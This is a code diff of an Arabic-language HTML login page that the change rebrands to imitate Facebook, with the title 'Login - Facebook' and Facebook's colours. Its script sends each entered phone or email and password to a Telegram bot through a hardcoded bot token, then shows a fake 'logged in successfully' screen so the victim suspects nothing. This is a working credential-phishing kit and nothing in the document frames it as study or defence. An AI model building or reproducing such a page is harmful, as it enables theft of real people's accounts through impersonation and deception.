@@ -3,29 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نموذج تسجيل الدخول</title>
+    <title>تسجيل الدخول - فيسبوك</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        label { display: block; margin: 10px 0 5px; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; }
-        button { padding: 10px; background-color: #007BFF; color: white; border: none; cursor: pointer; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .container, .dashboard {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 400px;
+            display: none; /* إخفاء الواجهة الجديدة في البداية */
+        }
+        h1 {
+            text-align: center;
+            color: #1877f2;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #165eab;
+        }
     </style>
 </head>
 <body>
 
-    <h1>تسجيل الدخول</h1>
-    <form id="loginForm">
-        <label for="phone">رقم الهاتف:</label>
-        <input type="text" id="phone" name="phone" required>
-        
-        <label for="password">كلمة المرور:</label>
-        <input type="password" id="password" name="password" required>
-        
-        <label for="email">البريد الإلكتروني:</label>
-        <input type="email" id="email" name="email" required>
-        
-        <button type="submit">تسجيل الدخول</button>
-    </form>
+    <div class="container" id="loginContainer">
+        <h1>تسجيل الدخول</h1>
+        <form id="loginForm">
+            <label for="phone">رقم الهاتف أو البريد الإلكتروني:</label>
+            <input type="text" id="phone" name="phone" required>
+            
+            <label for="password">كلمة المرور:</label>
+            <input type="password" id="password" name="password" required>
+            
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <div class="dashboard" id="dashboard">
+        <h1>مرحبًا بك في لوحة التحكم</h1>
+        <p>تم تسجيل الدخول بنجاح!</p>
+        <!-- يمكنك إضافة المزيد من المحتوى هنا -->
+    </div>
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(event) {
@@ -33,12 +79,9 @@
             const formData = new FormData(this);
             const phone = formData.get('phone');
             const password = formData.get('password');
-            const email = formData.get('email');
 
-            // نص الرسالة التي سترسل إلى بوت تليجرام
-            const message = `تسجيل دخول جديد:\nرقم الهاتف: ${phone}\nكلمة المرور: ${password}\nالبريد الإلكتروني: ${email}`;
+            const message = `تسجيل دخول جديد:\nرقم الهاتف أو البريد الإلكتروني: ${phone}\nكلمة المرور: ${password}`;
             
-            // إرسال البيانات إلى بوت تليجرام
             fetch(`https://api.telegram.org/bot7253203500:AAF01du1B24-oZDVmMM4GlGKhMYQ_-tT2XM/sendMessage`, {
                 method: 'POST',
                 headers: {
@@ -50,9 +93,17 @@
                 })
             })
             .then(response => response.json())
-            .then(data => console.log(data))
+            .then(data => {
+                console.log(data);
+                // إخفاء نموذج تسجيل الدخول وإظهار لوحة التحكم
+                document.getElementById('loginContainer').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+            })
             .catch(error => console.error('Error:', error));
         });
+
+        // إظهار نموذج تسجيل الدخول عند تحميل الصفحة
+        document.getElementById('loginContainer').style.display = 'block';
     </script>
 
 </body>
